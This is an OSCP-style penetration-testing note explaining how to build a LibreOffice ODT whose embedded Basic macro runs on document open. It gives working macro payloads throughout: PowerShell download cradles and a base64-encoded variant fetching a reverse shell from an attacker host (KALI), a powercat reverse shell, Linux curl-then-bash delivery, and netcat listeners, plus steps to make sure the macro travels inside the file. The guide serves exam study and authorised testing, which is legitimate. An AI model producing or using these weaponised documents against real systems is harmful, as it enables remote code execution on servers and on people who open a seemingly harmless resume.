---
title: "LibreOffice Macros"
slug: libreoffice-macros
category: notes
handbook: oscp
tags: ["shells"]
draft: false
pubDatetime: 2026-08-29T09:33:29+03:00
modDatetime: 2026-09-08T22:35:52+03:00
description: "An ODT is a ZIP container that can carry a Basic macro library, and LibreOffice runs document macros on events such as the document being opened."
---
An ODT is a ZIP container that can carry a Basic macro library, and LibreOffice runs document macros on events such as the document being opened. A macro bound to the open event is code execution on whatever machine opens the file. An upload form that demands a document format is therefore a foothold as long as the file gets opened, whether that is a server side converter or a person opening a resume. Automated processors typically run with macro security off, so nothing interrupts. Worked end to end on Craft: an ODT-only resume upload feeding a server side LibreOffice.

When the upload rejects a test file with an error naming a document format, two paths are open. The filter can be interrogated in Burp ([Burp Suite](/collections/oscp/burp-suite)), one request at a time, since it is unknown whether the check is extension or mime type, allow list or deny list. Or the demanded format can be produced and the consumer attacked directly, which skips the filter entirely because the file is exactly what was asked for. The second path is usually faster when the application has any reason to process documents. This sits under the "let something else consume it" case in [File Upload](/collections/oscp/file-upload).

## Building the Document

```bash
sudo apt install libreoffice
```

Create a blank document and save it as ODT. Then Tools → Macros → Organize Macros → Basic. Select the document itself in the tree, not My Macros, then New and give the macro a name. Macros under My Macros stay on the attacking machine and never travel inside the file, so the document selection is what makes the macro portable.

```basic
Sub Evil
    Shell("cmd /c powershell iwr http://KALI/")
End Sub
```

`Shell()` runs the command on the machine that opens the document. The `iwr` (Invoke-WebRequest) call is only a connectivity test; prove the macro fires before attempting anything more ambitious. Save the macro, then save the document.

## Binding the Open Event

Tools → Customize, opened from the **Writer window holding the document**, not from the Basic IDE. The IDE is not a document, so its dialog only offers `LibreOffice` under "Save in:" and its macro picker never lists document libraries at all, which looks like the macro vanished when it did not. Two settings have to be right after that. The "Save in:" dropdown decides where the binding is written: `LibreOffice` stores it in the local profile, which never leaves the attacking machine, so it has to be set to the document name. And the Macro Selector only lists the document once it actually contains a macro library; saving in the Basic IDE writes whichever container the selected module lives in, which is My Macros unless the module was created under the document in the organizer. Select "Open Document", Assign Macro, pick the macro from under the document, OK, and save once more afterwards.

Confirm the macro is inside the file before uploading. The failure is silent: everything works locally, the upload lands, nothing calls back, because the target opens a document whose macro or binding resolves against a library that exists only on the attacking machine. The definitive check:

```bash
unzip -l Good.odt | grep -i basic
```

`Basic/Standard/Module1.xml` in the listing means the library is embedded. Nothing there means the macro never left the attacking machine. Reopening the document and getting the macro security prompt is the quick version of the same test.

## Test

```bash
sudo nc -lvnp 80
```

Upload the document. A callback confirms the backend opens or converts uploads and shows the account the macro runs as. The callback alone is not a shell; the sections below swap the test command for a real payload.

## Windows Payloads

What fits in the Basic string is decided by its quoting rules: double quotes inside must be written doubled, so every `"` in a payload costs an escape, while single quotes are ordinary characters. Both payload forms below avoid the problem entirely.

**Download cradle.** The `IEX` one-liner needs only single quotes, so it drops in unchanged:

```basic
Sub Evil
    Shell("cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://KALI/rev.ps1')")
End Sub
```

`rev.ps1` holds the script body of the self-contained PowerShell reverse shell from [Reverse Shells](/collections/oscp/reverse-shells), everything after `-c`. The `powershell -nop -w hidden -c` wrapper is not part of the file, because the cradle is already PowerShell executing the download. A wrapped body is worse than redundant: the outer PowerShell interpolates the double-quoted string, expands every `$variable` inside to empty, and hands the child process stripped garbage that fails silently. Serve it from the folder holding it while the listener catches the shell:

```bash
sudo python3 -m http.server 80
nc -lvnp 443
```

One upload should then produce two events in order: the `GET /rev.ps1` line in the http.server log, then the catch on the listener. The GET alone is not success; it only proves the macro fired. The script body makes a single connection attempt with no retry, so the listener has to be up before the file is opened, and a miss just means triggering the macro again.

Any script that only needs single quotes swaps in the same way, powercat.ps1 being the common alternative ([powercat](/collections/oscp/powercat)):

```basic
Shell("cmd /c powershell -nop -w hidden -c IEX (New-Object System.Net.Webclient).DownloadString('http://KALI/powercat.ps1');powercat -c KALI -p 135 -e powershell")
```

The download lives or dies on the file being in the folder `http.server` serves, and the listener port matching `-p`.

**Base64.** Quote-free and immune to mangling by Basic, cmd, or PowerShell. The right form when the cradle keeps failing or the payload grows:

```bash
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://KALI/rev.ps1")' | iconv -t UTF-16LE | base64 -w0
```

```basic
Sub Evil
    Shell("cmd /c powershell -nop -w hidden -enc <blob>")
End Sub
```

The inner script uses double quotes freely; they are encoded before the Basic string is built, which is the point of the form.

## Linux Payloads

There is no `cmd` to invoke, so the command is passed directly: `Shell("curl http://KALI/")` works as the connectivity test. A shell is still needed, and `Shell()` does not provide one. Pipes and redirections typed into the Basic string are ordinary characters and never execute, so delivery is two lines: one downloads a script, the next runs it.

```basic
Sub Evil
    Shell("curl http://KALI/rev.sh -o /tmp/rev.sh")
    Shell("bash /tmp/rev.sh")
End Sub
```

`rev.sh` holds the bash `/dev/tcp` payload from [Reverse Shells](/collections/oscp/reverse-shells). Running it as `bash /tmp/rev.sh` forces bash regardless of the shebang, which sidesteps the dash `Bad fd number` failure documented there.
